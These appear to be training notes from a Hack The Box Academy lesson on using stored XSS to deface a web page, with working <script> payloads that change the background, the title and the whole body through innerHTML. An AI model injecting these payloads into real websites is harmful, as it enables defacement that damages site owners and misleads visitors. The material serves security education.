XSS, a stored XSS being the most critical, while a DOM-based being less so

`Defacing` a website means changing its look for anyone who visits the website. It is very common for hacker groups to deface a website to claim that they had successfully hacked it, like when hackers defaced the UK National Health Service (NHS) [back in 2018](https://www.bbc.co.uk/news/technology-43812539). Such attacks can carry great media echo and may significantly affect a company's investments and share prices, especially for banks and technology firms.

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

## Changing Background
```html
<script>document.body.style.background = "#141d2b"</script>
```

Tip: Here we set the background color to the default Hack The Box background color. We can use any other hex value, or can use a named color like `= "black"`.


Once we add our payload to the `To-Do` list, we will see that the background color changed

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```



## Changing Page Title
```html
<script>document.title = 'HackTheBox Academy'</script>
```

## Changing Page Text
```javascript
document.getElementById("todo").innerHTML = "New Text"
```

```javascript
$("#todo").html('New Text');
```


---
we will change the entire HTML code of the main `body`, using `innerHTML`, as follows:
```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

As we can see, we can specify the `body` element with `document.getElementsByTagName('body')`, and by specifying `[0]`, we are selecting the first `body` element, which should change the entire text of the web page. We may also use `jQuery` to achieve the same thing. However, before sending our payload and making a permanent change, we should prepare our HTML code separately and then use `innerHTML` to set our HTML code to the page source.

```html
<center>
    <h1 style="color: white">Cyber Security Training</h1>
    <p style="color: white">by 
        <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy">
    </p>
</center>
```

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

our injected payloads appear at the end:
This is because our injected JavaScript code changes the look of the page when it gets executed, which in this case, is at the end of the source code. If our injection was in an element in the middle of the source code, then other scripts or elements may get added after it, so we would have to account for them to get the final look we need.
